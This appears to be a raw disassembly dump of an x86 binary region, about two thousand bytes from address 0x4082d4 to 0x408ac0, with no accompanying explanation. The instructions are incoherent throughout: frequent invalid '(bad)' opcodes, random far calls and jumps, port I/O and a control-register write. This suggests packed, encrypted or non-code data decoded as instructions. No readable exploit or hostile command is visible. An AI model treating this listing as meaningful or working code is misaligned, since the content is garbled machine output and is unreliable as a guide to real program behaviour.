  4082d4:	div    DWORD PTR [ecx+0x53ff6cee]
  4082da:	in     al,0xbc
  4082dc:	or     ah,BYTE PTR [edi]
  4082de:	mov    al,ds:0x2e490ea5
  4082e3:	xor    eax,0xf7c9e8bc
  4082e8:	mov    WORD PTR [ebx],cs
  4082ea:	mov    gs,WORD PTR [ebp-0x7a]
  4082ed:	xor    BYTE PTR [esi+ebx*1+0x19],bh
  4082f1:	pusha  
  4082f2:	cld    
  4082f3:	inc    esp
  4082f4:	imul   edi,DWORD PTR [eax],0x6952c57d
  4082fa:	mov    esp,0xd245e035
  4082ff:	sbb    edx,DWORD PTR [edi]
  408301:	fbld   TBYTE PTR [ecx+0x13]
  408304:	push   ds
  408305:	sbb    BYTE PTR [edx-0x2],bh
  408308:	out    dx,al
  408309:	ds fwait
  40830b:	ret    
  40830c:	mov    ebp,0x47e670e6
  408311:	ret    0x9741
  408314:	xchg   esi,eax
  408315:	dec    eax
  408316:	into   
  408317:	loop   0x40830b
  408319:	pop    esi
  40831a:	xor    bl,BYTE PTR [ebx+0x34]
  40831d:	jns    0x4082b6
  40831f:	push   cs
  408320:	sbb    ecx,DWORD PTR [edi+0x3c]
  408323:	(bad)  
  408324:	fstp   DWORD PTR [edx-0x45aa3b45]
  40832a:	dec    esi
  40832b:	sub    bl,BYTE PTR [edx-0x2f]
  40832e:	inc    esi
  40832f:	mov    al,ds:0x51e4b9ee
  408334:	and    edx,DWORD PTR [eax]
  408336:	dec    ebx
  408337:	sub    ebx,DWORD PTR [eax+ebx*2-0x1d2dd2eb]
  40833e:	call   0xaf44:0xe3fdc285
  408345:	xchg   esi,eax
  408346:	popa   
  408347:	or     dh,ch
  408349:	daa    
  40834a:	fwait
  40834b:	push   0xffffffc2
  40834d:	popa   
  40834e:	nop
  40834f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408350:	or     DWORD PTR [ebx+eax*1],0x2b
  408354:	repz (bad) 
  408356:	iret   
  408357:	push   ss
  408358:	xchg   DWORD PTR [edi*1-0x2571e4de],eax
  40835f:	pop    ss
  408360:	(bad)  
  408361:	cmc    
  408362:	popa   
  408363:	mov    ch,0xff
  408365:	add    DWORD PTR [edi+eax*2-0x4b5714f1],eax
  40836c:	jbe    0x408387
  40836e:	cmp    eax,0x7f117e9e
  408373:	mov    bh,0x59
  408375:	fsubr  DWORD PTR [edx-0x4bcf6450]
  40837b:	out    0xd8,eax
  40837d:	lods   eax,DWORD PTR ds:[esi]
  40837e:	not    bh
  408380:	mov    dl,0xad
  408382:	and    bl,cl
  408384:	loope  0x408375
  408386:	or     DWORD PTR [ecx+0x40],ebp
  408389:	std    
  40838a:	or     ah,BYTE PTR [edx]
  40838c:	xchg   ebx,eax
  40838d:	dec    ecx
  40838e:	mov    esi,0x5eaa8730
  408393:	add    DWORD PTR [ebx-0x4c],esi
  408396:	mov    cl,0x13
  408398:	lods   al,BYTE PTR ds:[esi]
  408399:	mov    esi,0xf61f0e35
  40839e:	hlt    
  40839f:	(bad)
  4083a4:	retf   0xe4d4
  4083a7:	loope  0x4083e9
  4083a9:	dec    ebp
  4083aa:	xchg   DWORD PTR [eax],edx
  4083ac:	fnstsw WORD PTR [eax+0x35]
  4083af:	test   al,0x3
  4083b1:	sbb    al,0xdb
  4083b3:	mov    edi,0xc0b882a2
  4083b8:	pop    esp
  4083b9:	pop    ecx
  4083ba:	or     ebx,DWORD PTR [edi+eiz*8-0x67dd1a79]
  4083c1:	jle    0x408440
  4083c3:	daa    
  4083c4:	mov    al,0x95
  4083c6:	mov    ecx,0x8b3c3695
  4083cb:	jbe    0x408361
  4083cd:	icebp  
  4083ce:	fcomp  DWORD PTR [esi]
  4083d0:	cwde   
  4083d1:	xchg   edx,eax
  4083d2:	in     al,dx
  4083d3:	je     0x40840d
  4083d5:	adc    al,0x5
  4083d7:	push   esi
  4083d8:	lds    eax,FWORD PTR [ebp+0x77a1d902]
  4083de:	lea    esi,[edx+0x45f84664]
  4083e4:	loope  0x40845b
  4083e6:	loop   0x408402
  4083e8:	sub    DWORD PTR [ecx],eax
  4083ea:	rcl    DWORD PTR [edx-0x2f],cl
  4083ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083ee:	pop    edx
  4083ef:	popa   
  4083f0:	xchg   edx,eax
  4083f1:	in     eax,0x3c
  4083f3:	icebp  
  4083f4:	mov    ecx,0xd94ed3e1
  4083f9:	les    ebp,FWORD PTR [ebp-0x1e]
  4083fc:	pop    ebp
  4083fd:	fidivr WORD PTR [edi-0x106f396b]
  408403:	ins    BYTE PTR es:[edi],dx
  408404:	sbb    al,0xd7
  408406:	push   ss
  408407:	jge    0x4083f4
  408409:	pop    eax
  40840a:	pusha  
  40840b:	or     bh,BYTE PTR [eax+0x9]
  40840e:	jae    0x4083bb
  408410:	inc    ebp
  408411:	mov    edi,0x683f986a
  408416:	out    dx,al
  408417:	aas    
  408418:	daa    
  408419:	cmp    al,0x4f
  40841b:	ss pop es
  40841d:	pushf  
  40841e:	je     0x4083c9
  408420:	mov    ecx,0xfee0e285
  408425:	mov    es,edx
  408427:	fadd   QWORD PTR [eax]
  408429:	adc    bh,bh
  40842b:	loopne 0x40840b
  40842d:	and    eax,0x2daa21dc
  408432:	shl    BYTE PTR [esp+edx*4-0x4a961c1a],0x0
  40843a:	or     ch,BYTE PTR es:[edi]
  40843d:	adc    WORD PTR [edx],sp
  408440:	lods   eax,DWORD PTR ds:[esi]
  408441:	push   cs
  408442:	cwde   
  408443:	and    DWORD PTR [eax+0x13bfd330],0xf5936ba0
  40844d:	sbb    BYTE PTR [eax],bl
  40844f:	rcl    BYTE PTR [edx-0x6be480d2],0xe0
  408456:	pop    ds
  408457:	fimul  WORD PTR [ecx+0xd]
  40845a:	mov    dh,0x55
  40845c:	jmp    0x1a3:0x326232d7
  408463:	sub    BYTE PTR [ebx],ah
  408465:	or     al,0x12
  408467:	inc    ebx
  408468:	cmp    al,BYTE PTR [esi+0x12]
  40846b:	and    BYTE PTR [ebx-0x26],0x58
  40846f:	out    dx,ax
  408471:	icebp  
  408472:	dec    ecx
  408473:	sub    ah,BYTE PTR [ecx]
  408475:	xor    BYTE PTR [ecx+0x4d],0x9d
  408479:	loopne 0x4084de
  40847b:	and    al,0x56
  40847d:	mov    ecx,0x8390cf5f
  408482:	add    al,0x2c
  408484:	pop    ss
  408485:	scas   eax,DWORD PTR es:[edi]
  408486:	ins    DWORD PTR es:[edi],dx
  408487:	mov    eax,DWORD PTR [edx-0x64]
  40848a:	cmp    ebx,eax
  40848c:	aam    0x9b
  40848e:	and    BYTE PTR [edx+0xef6c90e],cl
  408494:	inc    eax
  408495:	jp     0x408496
  408497:	xchg   edi,eax
  408498:	not    dl
  40849a:	jnp    0x408462
  40849c:	cmp    esi,DWORD PTR [ebx+0x5cbcd938]
  4084a2:	push   eax
  4084a3:	es push ebx
  4084a5:	into   
  4084a6:	(bad)  
  4084a7:	cmp    al,0x7c
  4084a9:	rcr    BYTE PTR [esi],0xb
  4084ac:	addr16 sti 
  4084ae:	fs add al,0x88
  4084b1:	or     ah,BYTE PTR [esi]
  4084b3:	loop   0x4084bb
  4084b5:	mov    al,ds:0xfce1a4e4
  4084ba:	dec    ebx
  4084bb:	add    BYTE PTR [esi+esi*2],al
  4084be:	adc    eax,0x5c6ecae2
  4084c3:	push   ds
  4084c4:	mov    DWORD PTR [edi-0x7b],eax
  4084c7:	pop    eax
  4084c8:	dec    edx
  4084c9:	les    esi,FWORD PTR [ebx]
  4084cb:	mov    esi,0x1d77c447
  4084d0:	les    edi,FWORD PTR [eax-0x33]
  4084d3:	imul   esi,DWORD PTR [eax-0x7923334a],0xe98f9593
  4084dd:	les    esi,FWORD PTR [esi+0x16]
  4084e0:	mov    esi,0x81068e6b
  4084e5:	push   ds
  4084e6:	adc    BYTE PTR [esi],dh
  4084e8:	adc    ebp,DWORD PTR [eax+0x28]
  4084eb:	jmp    0x72fb:0xd6e4ba34
  4084f2:	aad    0xcb
  4084f4:	xor    DWORD PTR [eax-0x2c2df14d],0xffffffd8
  4084fb:	cmp    BYTE PTR [ecx+0x35],bl
  4084fe:	aad    0xfe
  408500:	ret    
  408501:	push   ds
  408502:	fbstp  TBYTE PTR [ecx-0x5cac454f]
  408508:	lahf   
  408509:	cs and DWORD PTR ds:[esi+eax*1],edi
  40850e:	jmp    0x474b:0x3639e6d1
  408515:	xchg   edx,eax
  408516:	daa    
  408517:	je     0x4084c7
  408519:	mov    al,ds:0xa429d115
  40851e:	mov    esp,0xc35c7c12
  408523:	fwait
  408524:	dec    ebx
  408525:	jnp    0x4084f0
  408527:	popf   
  408528:	sub    eax,0x52a02bd8
  40852d:	int    0xda
  40852f:	push   esp
  408530:	lds    ecx,FWORD PTR [edx+0x7124c347]
  408536:	pop    es
  408537:	into   
  408538:	xchg   ecx,eax
  408539:	dec    ebx
  40853a:	add    esp,ebp
  40853c:	pop    ebx
  40853d:	leave  
  40853e:	pop    ebp
  40853f:	loopne 0x408543
  408541:	(bad)  
  408543:	sbb    al,0x78
  408545:	in     eax,0x1
  408547:	stos   BYTE PTR es:[edi],al
  408548:	cmp    al,0xfb
  40854a:	push   ecx
  40854b:	push   es
  40854c:	mov    cl,0xd5
  40854e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40854f:	nop
  408550:	rcl    al,1
  408552:	cli    
  408553:	rol    ch,cl
  408555:	mov    ebx,0xceaaa8bf
  40855a:	in     eax,dx
  40855b:	loope  0x408519
  40855d:	mov    DWORD PTR ds:0x9bfef106,ebx
  408563:	scas   eax,DWORD PTR es:[edi]
  408564:	jecxz  0x408526
  408566:	and    al,0x59
  408568:	adc    ch,BYTE PTR ds:0x6cfada0b
  40856e:	mov    edx,0xc6f61455
  408573:	dec    ebx
  408574:	mov    ds:0x3dac6e32,eax
  408579:	(bad)  
  40857a:	rol    BYTE PTR [ebx-0x23f1ad4d],cl
  408580:	int    0x23
  408582:	and    ecx,DWORD PTR [esi]
  408584:	mov    al,0x75
  408586:	sti    
  408587:	pop    ds
  408588:	rcl    ebx,cl
  40858a:	mov    eax,gs:0x6d6bbe3e
  408590:	stos   BYTE PTR es:[edi],al
  408591:	adc    esp,ebx
  408593:	aam    0x92
  408595:	lds    eax,FWORD PTR [ebp+0x72b84596]
  40859b:	sbb    ah,BYTE PTR [eax+0x6d]
  40859e:	arpl   dx,ax
  4085a0:	mov    fs,esi
  4085a2:	das    
  4085a3:	jae    0x408567
  4085a5:	jb     0x40854c
  4085a7:	pop    esi
  4085a8:	addr16 fwait
  4085aa:	push   0x731e68f8
  4085af:	in     eax,0x95
  4085b1:	call   0x35df:0x5c837656
  4085b8:	out    dx,eax
  4085b9:	ret    
  4085ba:	push   ebx
  4085bb:	inc    eax
  4085bc:	or     eax,DWORD PTR [ecx-0x5a]
  4085bf:	outs   dx,DWORD PTR ds:[esi]
  4085c0:	data16 sbb bl,ah
  4085c3:	(bad)
  4085c6:	dec    edi
  4085c7:	fcmovu st,st(7)
  4085c9:	jo     0x40858d
  4085cb:	repnz sar DWORD PTR [edi+0xe],cl
  4085cf:	idiv   ebx
  4085d1:	sbb    dh,BYTE PTR [eax-0x39]
  4085d4:	popa   
  4085d5:	and    edx,esp
  4085d7:	xchg   esp,eax
  4085d8:	mov    eax,DWORD PTR [esi-0x19]
  4085db:	popf   
  4085dc:	nop
  4085dd:	cmp    DWORD PTR [ebp-0x42],0x6fa19f3f
  4085e4:	pop    es
  4085e5:	in     eax,dx
  4085e6:	pop    ecx
  4085e7:	fst    QWORD PTR [eax+0x6e]
  4085ea:	jo     0x40856e
  4085ec:	aas    
  4085ed:	mov    DWORD PTR [ebx],edx
  4085ef:	add    al,0xdc
  4085f1:	les    edx,FWORD PTR [ecx-0x23]
  4085f4:	jne    0x408598
  4085f6:	frstor [ebp+0x18f2e606]
  4085fc:	sub    BYTE PTR [eax],ch
  4085fe:	js     0x4085a1
  408600:	or     cl,BYTE PTR [ebp-0x23]
  408603:	rcr    BYTE PTR [edx],cl
  408605:	and    ch,BYTE PTR [edx-0x75]
  408608:	out    0x44,al
  40860a:	cli    
  40860b:	stc    
  40860c:	dec    bl
  40860e:	frstor cs:[edi+edi*8-0x3f877107]
  408616:	push   ebx
  408617:	repz sub bh,ch
  40861a:	adc    dh,bh
  40861c:	push   esp
  40861d:	mov    BYTE PTR fs:[edi+edx*4+0x50],ch
  408622:	mov    edi,DWORD PTR [ebx]
  408624:	jge    0x40861f
  408626:	pop    eax
  408627:	loopne 0x4086a7
  408629:	push   0x26d36345
  40862e:	cmp    edx,edx
  408630:	test   BYTE PTR [ecx],ah
  408632:	pop    ecx
  408633:	ins    BYTE PTR es:[edi],dx
  408634:	jnp    0x408686
  408636:	jmp    0x4085bf
  408638:	imul   edx,DWORD PTR [ecx-0x5c],0xd6e71e4a
  40863f:	jmp    0x408651
  408641:	xor    DWORD PTR [esi-0x6d15a728],esi
  408647:	(bad)  
  408648:	xchg   edx,eax
  408649:	jp     0x4086ae
  40864b:	inc    eax
  40864c:	jge    0x4086cd
  40864e:	push   ss
  40864f:	div    DWORD PTR [edi]
  408651:	inc    esi
  408652:	es in  eax,0x58
  408655:	scas   eax,DWORD PTR es:[edi]
  408656:	retf   
  408657:	leave  
  408658:	xor    ah,BYTE PTR [ebx-0x462e969]
  40865e:	dec    edx
  40865f:	add    al,0xef
  408661:	call   0x78b1:0x7067becd
  408668:	xchg   edi,eax
  408669:	repnz mov dl,BYTE PTR [ebx+0x513d9cb]
  408670:	and    DWORD PTR [ebx-0x29],esp
  408673:	js     0x408600
  408675:	adc    eax,0x905bab8d
  40867a:	sbb    BYTE PTR [ecx+ebx*8+0x35],0x96
  40867f:	push   esp
  408680:	xchg   esp,eax
  408681:	test   esi,esi
  408683:	or     eax,0x3864622
  408688:	lods   eax,DWORD PTR ds:[esi]
  408689:	cmp    esp,eax
  40868b:	and    al,0xae
  40868d:	or     BYTE PTR [edx+esi*4+0x4d],0x42
  408692:	jnp    0x4086dc
  408694:	sti    
  408695:	push   cs
  408696:	pop    ds
  408697:	add    BYTE PTR [ecx+0x5e48a58c],dh
  40869d:	push   ebp
  40869e:	add    al,0x6c
  4086a0:	das    
  4086a1:	cmc    
  4086a2:	shl    BYTE PTR ds:0x92254049,cl
  4086a8:	scas   eax,DWORD PTR es:[edi]
  4086a9:	cs ja  0x408714
  4086ac:	out    0xed,eax
  4086ae:	les    esi,FWORD PTR [edx+esi*1+0x52371839]
  4086b5:	pop    esp
  4086b6:	dec    edi
  4086b7:	mov    esi,0x54e5535a
  4086bc:	fdiv   QWORD PTR es:[eax+0x77]
  4086c0:	enter  0xe15a,0x3d
  4086c4:	xchg   ebx,esp
  4086c6:	in     al,dx
  4086c7:	push   ss
  4086c8:	imul   edx,DWORD PTR [ecx+0x6a],0x6bae8508
  4086cf:	ret    0x7091
  4086d2:	mov    eax,ds:0xd04812fb
  4086d7:	pop    edx
  4086d8:	(bad)  
  4086d9:	lock xlat BYTE PTR ds:[ebx]
  4086db:	mov    WORD PTR [ebx+0x45],0x46c1
  4086e1:	cmp    al,0x71
  4086e3:	(bad)  [ecx-0x5580ff9d]
  4086e9:	xchg   ebp,eax
  4086ea:	out    dx,eax
  4086eb:	iretw  
  4086ed:	or     BYTE PTR [ecx],dl
  4086ef:	sub    eax,0x846fd7d5
  4086f4:	mov    ch,0xe3
  4086f6:	adc    eax,0xc08dae5c
  4086fb:	jg     0x408748
  4086fd:	mov    dl,BYTE PTR [ebx+0x4f91d395]
  408703:	inc    esi
  408704:	repz cs dec eax
  408707:	cmp    eax,0x508c292d
  40870c:	out    0x9c,eax
  40870e:	pusha  
  40870f:	adc    DWORD PTR [esi],0x37
  408712:	nop
  408713:	mov    ?,WORD PTR [ebx-0x77]
  408716:	ja     0x408795
  408718:	rol    DWORD PTR [ebx],cl
  40871a:	add    eax,0x2d76f80f
  40871f:	push   ss
  408720:	ret    
  408721:	sub    edi,DWORD PTR [eax+0x60a603f0]
  408727:	cld    
  408728:	inc    ebx
  408729:	add    edx,eax
  40872b:	and    bh,BYTE PTR [ebp+0x7090daa9]
  408731:	jmp    0x4086f7
  408733:	cmp    al,0xc7
  408735:	xchg   esp,eax
  408736:	add    BYTE PTR [edx+0x17],bh
  408739:	shl    BYTE PTR [esi+0x417ba014],cl
  40873f:	mov    dl,0x54
  408741:	pop    esi
  408742:	sahf   
  408743:	fwait
  408744:	sahf   
  408745:	les    edi,FWORD PTR [edx+0x5f]
  408748:	xchg   edi,eax
  408749:	addr16 ret 
  40874b:	aam    0xf
  40874d:	arpl   WORD PTR [ebp-0x3c],bp
  408750:	add    eax,edi
  408752:	retf   
  408753:	sub    ch,ah
  408755:	loopne 0x4087b9
  408757:	and    eax,DWORD PTR [ebx]
  408759:	sub    DWORD PTR [ebx],edi
  40875b:	mov    DWORD PTR [esi-0x214e85dc],ecx
  408761:	stos   DWORD PTR es:[edi],eax
  408762:	popf   
  408763:	bts    DWORD PTR [edi+0x1f8356f1],esi
  40876a:	adc    dl,0x41
  40876d:	mov    edx,0xb0072499
  408772:	or     bl,BYTE PTR [edi+0x11fd587e]
  408778:	add    eax,0xbc5ca7a6
  40877d:	in     eax,dx
  40877e:	push   ds
  40877f:	retf   0xc849
  408782:	shl    BYTE PTR [edi+0x38925bf6],0xf4
  408789:	or     DWORD PTR [ecx],edi
  40878b:	je     0x408807
  40878d:	arpl   WORD PTR [ecx+0x49c7dff2],bx
  408793:	addr16 in al,0x7
  408796:	add    al,0x67
  408798:	pop    eax
  408799:	repnz (bad) 
  40879b:	dec    esi
  40879c:	out    0x95,al
  40879e:	cwde   
  40879f:	adc    DWORD PTR [ecx+0x66738a5],ecx
  4087a5:	xlat   BYTE PTR ds:[ebx]
  4087a6:	mov    al,0x3
  4087a8:	scas   eax,DWORD PTR es:[edi]
  4087a9:	(bad)
  4087ac:	fdiv   QWORD PTR [edx+0x4f4a5619]
  4087b2:	mov    bl,0x7e
  4087b5:	lods   eax,DWORD PTR ds:[esi]
  4087b6:	mov    ch,0x90
  4087b8:	pusha  
  4087b9:	mov    ds:0xe352c59a,eax
  4087be:	pushf  
  4087bf:	cli    
  4087c0:	mov    bh,0xce
  4087c2:	sti    
  4087c3:	in     eax,0x5d
  4087c5:	scas   eax,DWORD PTR es:[edi]
  4087c6:	and    cl,BYTE PTR [ebp+edx*4+0x59e9616c]
  4087cd:	xchg   ebx,eax
  4087ce:	out    0xf7,al
  4087d0:	iret   
  4087d1:	pop    ebp
  4087d2:	es pusha 
  4087d4:	sbb    dl,BYTE PTR [edi]
  4087d6:	cld    
  4087d7:	mov    WORD PTR [edi+edi*1-0x73b38a74],ds
  4087de:	mov    al,0xb4
  4087e0:	into   
  4087e1:	or     BYTE PTR [edx],bh
  4087e3:	frstor [edx-0x2af74462]
  4087e9:	lds    esp,FWORD PTR [edx]
  4087eb:	mov    ecx,0x16c4e41
  4087f0:	mov    dl,BYTE PTR [eax+0x77]
  4087f3:	ins    DWORD PTR es:[edi],dx
  4087f4:	xchg   BYTE PTR [edx-0x78],ch
  4087f7:	or     al,0x83
  4087f9:	rcl    ebp,1
  4087fb:	jp     0x4087ab
  4087fd:	push   ebx
  4087fe:	sti    
  4087ff:	out    dx,eax
  408800:	neg    BYTE PTR [ecx-0x6b]
  408803:	into   
  408804:	inc    ebp
  408805:	mov    esp,DWORD PTR [esi-0x5a]
  408808:	xor    dl,BYTE PTR [ebx]
  40880a:	test   BYTE PTR [ebp-0x7b],0xda
  40880e:	loopne 0x40888a
  408810:	imul   ebp,esi,0x1b301fea
  408816:	retf   
  408817:	es ds xor edi,0x55
  40881c:	mov    esp,0x1e1e0ee9
  408821:	push   esp
  408822:	push   ss
  408823:	mov    bl,0xd6
  408825:	xchg   edx,eax
  408826:	ffree  st(5)
  408828:	into   
  408829:	pop    edi
  40882a:	mov    ch,0x9f
  40882c:	into   
  40882d:	and    eax,eax
  40882f:	pusha  
  408830:	je     0x4087e2
  408832:	cmp    al,0x41
  408834:	push   esp
  408835:	dec    ebp
  408836:	jecxz  0x40888a
  408838:	sbb    BYTE PTR fs:[ebx],0x71
  40883c:	adc    ch,BYTE PTR [edi-0x1b]
  40883f:	lds    edx,FWORD PTR [eax-0x3d3bdb3b]
  408845:	mov    cl,0xa6
  408847:	adc    al,0xd4
  408849:	loop   0x4087ce
  40884b:	add    DWORD PTR [ebx+0x6ba6fb37],eax
  408851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408852:	jae    0x408813
  408854:	push   ebp
  408855:	xchg   BYTE PTR [edx+0x54],bh
  408858:	pop    ds
  408859:	cmp    eax,0x8b0f64ec
  40885e:	jle    0x40885e
  408860:	add    eax,ebp
  408862:	cmp    bh,BYTE PTR [eax]
  408864:	clc    
  408865:	shl    dh,cl
  408867:	ret    0x4ca0
  40886a:	jno    0x408842
  40886c:	and    DWORD PTR [edx],0x77
  40886f:	pusha  
  408870:	test   BYTE PTR [ebp+0x2c],bl
  408873:	mov    eax,0x4e75c1cd
  408878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408879:	or     eax,0x74ea93a7
  40887e:	add    edi,esi
  408880:	pop    es
  408881:	mov    ah,0x97
  408883:	fsub   st(5),st
  408885:	in     eax,0xa4
  408887:	sub    DWORD PTR [edi],eax
  408889:	xchg   al,ah
  40888b:	sahf   
  40888c:	jb     0x408865
  40888e:	fwait
  40888f:	stos   DWORD PTR es:[edi],eax
  408890:	mov    bl,0xd1
  408892:	clc    
  408893:	inc    esi
  408894:	(bad)  
  408895:	jge    0x4088ad
  408897:	(bad)  
  408898:	push   ds
  408899:	aam    0xe8
  40889b:	push   ebx
  40889c:	scas   al,BYTE PTR es:[edi]
  40889d:	mov    edi,esp
  40889f:	dec    eax
  4088a0:	push   esp
  4088a1:	pop    es
  4088a2:	lods   al,BYTE PTR ss:[esi]
  4088a4:	jnp    0x408857
  4088a6:	pushf  
  4088a7:	and    BYTE PTR [esi+0x6c3210b0],0x65
  4088ae:	and    ecx,ebx
  4088b0:	add    eax,edx
  4088b2:	cmc    
  4088b3:	jp     0x408930
  4088b5:	adc    al,ah
  4088b7:	(bad)  
  4088b8:	cld    
  4088b9:	push   ebp
  4088ba:	pop    eax
  4088bb:	inc    esi
  4088bc:	jecxz  0x40889e
  4088be:	xchg   ebx,eax
  4088bf:	jb     0x40887c
  4088c1:	push   ds
  4088c2:	push   0x5bdd60ea
  4088c7:	mov    bh,0xcb
  4088c9:	shl    BYTE PTR [edx],1
  4088cb:	xchg   ecx,eax
  4088cc:	mov    al,0xb6
  4088ce:	(bad)  [eax]
  4088d0:	pop    esp
  4088d1:	push   0x61ef6aa4
  4088d6:	icebp  
  4088d7:	cdq    
  4088d8:	inc    edx
  4088d9:	mov    ds:0xce6a007b,al
  4088de:	daa    
  4088df:	stos   DWORD PTR es:[edi],eax
  4088e0:	mov    edi,0x4ddf4682
  4088e5:	jbe    0x408886
  4088e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e8:	cwde   
  4088e9:	sub    al,0x7f
  4088eb:	adc    BYTE PTR [edi],bh
  4088ed:	jne    0x408932
  4088ef:	xchg   ecx,eax
  4088f0:	push   eax
  4088f1:	mov    dh,0x9c
  4088f3:	adc    ah,BYTE PTR [ecx]
  4088f5:	pop    ebx
  4088f6:	out    0xd3,eax
  4088f8:	test   eax,0x6b253f8a
  4088fd:	iret   
  4088fe:	push   0xffffffe6
  408900:	push   eax
  408901:	xor    eax,0x313d481d
  408906:	div    DWORD PTR [ebp-0x2e]
  408909:	mov    bh,0xf6
  40890b:	mov    ecx,0xe0cae0da
  408910:	out    dx,al
  408911:	ror    DWORD PTR [eax],0x94
  408914:	daa    
  408915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408916:	xor    bh,dh
  408918:	(bad)  
  408919:	jo     0x408994
  40891b:	lods   al,BYTE PTR ds:[esi]
  40891c:	jmp    0x408947
  40891e:	jb     0x408969
  408920:	inc    ebp
  408921:	call   0x38af:0xff9975d5
  408928:	fisubr DWORD PTR [eax-0x18]
  40892b:	push   esi
  40892c:	out    0xda,al
  40892e:	loope  0x408970
  408930:	sub    BYTE PTR [ecx+0x18733c9e],0xe6
  408937:	pop    ss
  408938:	cli    
  408939:	push   0x2b3c4f1d
  40893e:	push   0xffffffcd
  408940:	xchg   edi,eax
  408941:	mov    al,ds:0x231a1357
  408946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408947:	in     al,0x81
  408949:	mov    cr7,eax
  40894c:	xor    eax,0xb34c10d6
  408951:	in     al,0x84
  408953:	out    dx,eax
  408954:	imul   edi,DWORD PTR [edx-0x360bc4f8],0xffffffd9
  40895b:	pop    eax
  40895c:	pop    es
  40895d:	push   es
  40895e:	fst    QWORD PTR [eax]
  408960:	push   0xffffffa4
  408962:	cmp    al,0xf4
  408964:	fld    st(1)
  408966:	and    eax,0x7716a126
  40896b:	mov    BYTE PTR [esi+0x779e70c7],dh
  408971:	inc    edi
  408972:	jp     0x408917
  408974:	imul   esi,DWORD PTR [edi+ebx*1],0x1e
  408978:	push   ds
  408979:	outs   dx,BYTE PTR ds:[esi]
  40897a:	imul   esp,DWORD PTR [ecx+0x1e8eea44],0xff3230e9
  408984:	idiv   esp
  408986:	xchg   ebx,eax
  408987:	dec    ebp
  408988:	sbb    bh,0xb1
  40898b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40898c:	retf   0x84c8
  40898f:	or     al,0x0
  408991:	sub    edx,DWORD PTR [ecx+0xc]
  408994:	mov    ebp,0x5544315b
  408999:	mov    esp,0x6acd0626
  40899e:	repz add BYTE PTR [ebx-0x4ff00c0d],bl
  4089a5:	pop    es
  4089a6:	sub    DWORD PTR [ebp+0x21fea6a3],edi
  4089ac:	int3   
  4089ad:	and    BYTE PTR [eax+ebp*1-0x1ddcdcf0],dh
  4089b4:	mov    bl,0x2e
  4089b6:	xor    BYTE PTR [eax-0x5aba4bd9],dh
  4089bc:	dec    edx
  4089bd:	push   cs
  4089be:	setno  al
  4089c1:	out    0x38,al
  4089c3:	xor    BYTE PTR [esi+0x286a0c64],dl
  4089c9:	jl     0x408963
  4089cb:	push   fs
  4089cd:	pop    edx
  4089ce:	jmp    0x408977
  4089d0:	ret    0x72f9
  4089d3:	loop   0x408a4b
  4089d5:	ds push 0x74
  4089d8:	add    al,0x21
  4089da:	das    
  4089db:	or     ch,0x7e
  4089de:	or     al,0xb6
  4089e0:	(bad)  
  4089e1:	daa    
  4089e2:	jae    0x408a19
  4089e4:	shr    BYTE PTR [edx-0x286e2c80],0xf5
  4089eb:	stos   DWORD PTR es:[edi],eax
  4089ec:	push   ebx
  4089ed:	pop    eax
  4089ee:	icebp  
  4089ef:	ss xor eax,0x61fd8516
  4089f5:	or     DWORD PTR [esp+edi*4],esp
  4089f8:	(bad)  
  4089f9:	lock pop es
  4089fb:	imul   eax,ebp,0x4e
  4089fe:	jmp    0xc3fd6487
  408a03:	mov    bl,0x2f
  408a05:	or     al,0x11
  408a07:	xor    DWORD PTR [ebx-0x44],ebx
  408a0a:	xor    edx,edi
  408a0c:	leave  
  408a0d:	cld    
  408a0e:	clc    
  408a0f:	ret    
  408a10:	in     eax,0xa2
  408a12:	jecxz  0x408a7c
  408a14:	mov    si,0x580f
  408a18:	hlt    
  408a19:	cmp    BYTE PTR [ebp+ebx*4-0x9c3af93],dh
  408a20:	scas   eax,DWORD PTR es:[edi]
  408a21:	pop    ebp
  408a22:	jg     0x408a78
  408a24:	and    bl,BYTE PTR ds:0x7b094862
  408a2a:	jmp    0x408a26
  408a2c:	aaa    
  408a2d:	mov    ecx,0xe647ead4
  408a32:	stc    
  408a33:	in     eax,0x7d
  408a35:	dec    ebx
  408a36:	dec    esi
  408a37:	out    dx,al
  408a38:	lds    edi,FWORD PTR [ebx+0x203331d9]
  408a3e:	mov    eax,0x5f5ed6fb
  408a43:	dec    ebx
  408a44:	add    al,0x47
  408a46:	jno    0x408aa3
  408a48:	in     al,dx
  408a49:	jnp    0x408a03
  408a4b:	adc    eax,DWORD PTR [edx+0x22328476]
  408a51:	loope  0x408a17
  408a53:	sar    al,1
  408a55:	icebp  
  408a56:	in     ax,0xa6
  408a59:	dec    ax
  408a5b:	mov    BYTE PTR [ebx],bl
  408a5d:	(bad)  
  408a5e:	push   ds
  408a5f:	and    DWORD PTR [edi+0x6540b7ff],ebp
  408a65:	je     0x408ae0
  408a67:	sbb    al,0x42
  408a69:	nop
  408a6a:	mov    es,WORD PTR [edi-0x45b2a36a]
  408a70:	test   DWORD PTR [ecx],ebx
  408a72:	in     eax,0x7e
  408a74:	sub    eax,0xa996e202
  408a79:	push   ecx
  408a7a:	xor    al,0xc5
  408a7c:	or     al,BYTE PTR [esp+esi*8-0x133353b2]
  408a83:	push   ecx
  408a84:	xor    BYTE PTR [ecx-0x4d310f3e],ah
  408a8a:	sub    eax,0x5caf5561
  408a8f:	outs   dx,DWORD PTR ds:[esi]
  408a90:	aad    0x69
  408a92:	test   edx,ecx
  408a94:	jle    0x408a54
  408a96:	adc    al,0xd6
  408a98:	xor    edx,DWORD PTR [edi-0x176207a0]
  408a9e:	aas    
  408a9f:	leave  
  408aa0:	sbb    BYTE PTR [ebx-0x6d],cl
  408aa3:	sar    DWORD PTR [ebx+0x502e16db],1
  408aa9:	sbb    al,0x74
  408aab:	mov    edx,0xb1cd14b8
  408ab0:	and    cl,BYTE PTR [esi]
  408ab2:	aaa    
  408ab3:	mov    cl,0x5
  408ab5:	mov    al,ds:0x421b0bd3
  408aba:	or     eax,0xda6ea07d
  408abf:	outs   dx,BYTE PTR ds:[esi]
  408ac0:	iret   
